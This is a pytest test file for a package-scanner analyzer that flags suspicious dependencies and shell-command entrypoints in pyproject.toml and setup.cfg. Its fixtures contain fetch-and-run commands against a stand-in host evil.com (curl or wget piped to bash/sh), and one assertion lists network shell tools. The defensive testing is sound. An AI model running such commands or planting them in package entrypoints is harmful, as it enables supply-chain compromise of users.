"""Tests for ConfigFileAnalyzer — pyproject.toml and setup.cfg parsing."""

import pytest

from pkgxray.analyzers.config_files import ConfigFileAnalyzer
from pkgxray.analyzers.base import Severity


@pytest.fixture
def analyzer():
    return ConfigFileAnalyzer()


# ---------------------------------------------------------------------------
# pyproject.toml — suspicious build dependencies
# ---------------------------------------------------------------------------

def test_pyproject_suspicious_build_dep_flagged(analyzer):
    toml = (
        '[build-system]\n'
        'requires = ["setuptools", "requests"]\n'
        'build-backend = "setuptools.build_meta"\n'
    )
    findings = analyzer.analyze(toml, "pyproject.toml")
    assert any("requests" in f.description for f in findings)
    assert any(f.severity == Severity.HIGH for f in findings)


def test_pyproject_clean_build_deps_not_flagged(analyzer):
    toml = (
        '[build-system]\n'
        'requires = ["hatchling"]\n'
        'build-backend = "hatchling.build"\n'
    )
    findings = analyzer.analyze(toml, "pyproject.toml")
    assert len(findings) == 0


# ---------------------------------------------------------------------------
# pyproject.toml — malicious entrypoints
# ---------------------------------------------------------------------------

def test_pyproject_shell_command_in_script_flagged(analyzer):
    toml = (
        '[project]\n'
        'name = "evil-pkg"\n'
        'version = "1.0.0"\n'
        '\n'
        '[project.scripts]\n'
        'run-me = "curl http://evil.com/payload | bash"\n'
    )
    findings = analyzer.analyze(toml, "pyproject.toml")
    assert any(f.severity == Severity.CRITICAL for f in findings)
    # _SHELL_KEYWORDS is a set so iteration order varies — check any shell kw matched
    assert any(
        kw in f.description for f in findings
        for kw in ("curl", "bash", "wget", "sh", "nc")
    )


def test_pyproject_clean_entrypoint_not_flagged(analyzer):
    toml = (
        '[project]\n'
        'name = "my-pkg"\n'
        'version = "1.0.0"\n'
        '\n'
        '[project.scripts]\n'
        'my-cli = "my_pkg.cli:main"\n'
    )
    findings = analyzer.analyze(toml, "pyproject.toml")
    assert len(findings) == 0


def test_pyproject_wget_in_entrypoint_flagged(analyzer):
    toml = (
        '[project.scripts]\n'
        'setup = "wget http://evil.com/setup.sh -O - | sh"\n'
    )
    findings = analyzer.analyze(toml, "pyproject.toml")
    assert any(f.severity == Severity.CRITICAL for f in findings)


# ---------------------------------------------------------------------------
# pyproject.toml — tool hooks
# ---------------------------------------------------------------------------

def test_pyproject_tool_hooks_flagged(analyzer):
    toml = (
        '[tool.hatch.build.hooks.custom]\n'
        'path = "hatch_build.py"\n'
    )
    # configparser-style section — may or may not produce findings depending on TOML structure
    # The key test: no crash and returns a list
    findings = analyzer.analyze(toml, "pyproject.toml")
    assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# pyproject.toml — resilience
# ---------------------------------------------------------------------------

def test_pyproject_invalid_toml_no_crash(analyzer):
    findings = analyzer.analyze("this is not : valid [ toml !!!", "pyproject.toml")
    assert isinstance(findings, list)


def test_pyproject_empty_file_no_crash(analyzer):
    findings = analyzer.analyze("", "pyproject.toml")
    assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# setup.cfg — suspicious install_requires
# ---------------------------------------------------------------------------

def test_setup_cfg_suspicious_dep_flagged(analyzer):
    cfg = (
        "[metadata]\n"
        "name = evil-pkg\n"
        "version = 1.0.0\n"
        "\n"
        "[options]\n"
        "install_requires =\n"
        "    requests\n"
        "    boto3\n"
    )
    findings = analyzer.analyze(cfg, "setup.cfg")
    names = [f.description for f in findings]
    assert any("boto3" in d or "requests" in d for d in names)


def test_setup_cfg_clean_deps_not_flagged(analyzer):
    cfg = (
        "[metadata]\n"
        "name = clean-pkg\n"
        "version = 1.0.0\n"
        "\n"
        "[options]\n"
        "install_requires =\n"
        "    click>=8.0\n"
        "    rich>=13.0\n"
    )
    findings = analyzer.analyze(cfg, "setup.cfg")
    assert len(findings) == 0


# ---------------------------------------------------------------------------
# setup.cfg — malicious entrypoints
# ---------------------------------------------------------------------------

def test_setup_cfg_shell_in_entrypoint_flagged(analyzer):
    cfg = (
        "[options.entry_points]\n"
        "console_scripts =\n"
        "    evil = curl http://evil.com | bash\n"
    )
    findings = analyzer.analyze(cfg, "setup.cfg")
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_setup_cfg_clean_entrypoint_not_flagged(analyzer):
    cfg = (
        "[options.entry_points]\n"
        "console_scripts =\n"
        "    my-tool = my_pkg.cli:main\n"
    )
    findings = analyzer.analyze(cfg, "setup.cfg")
    assert len(findings) == 0


# ---------------------------------------------------------------------------
# setup.cfg — resilience
# ---------------------------------------------------------------------------

def test_setup_cfg_invalid_no_crash(analyzer):
    findings = analyzer.analyze("[[[[not valid cfg", "setup.cfg")
    assert isinstance(findings, list)


def test_setup_cfg_empty_no_crash(analyzer):
    findings = analyzer.analyze("", "setup.cfg")
    assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# Routing — non-config files are ignored
# ---------------------------------------------------------------------------

def test_python_file_ignored(analyzer):
    findings = analyzer.analyze('import os\nos.system("evil")', "evil.py")
    assert len(findings) == 0


def test_unknown_extension_ignored(analyzer):
    findings = analyzer.analyze("anything", "requirements.txt")
    assert len(findings) == 0


# ---------------------------------------------------------------------------
# Analyzer metadata
# ---------------------------------------------------------------------------

def test_analyzer_name(analyzer):
    toml = '[build-system]\nrequires = ["requests"]\nbuild-backend = "setuptools.build_meta"\n'
    findings = analyzer.analyze(toml, "pyproject.toml")
    assert all(f.analyzer_name == "config_files" for f in findings)
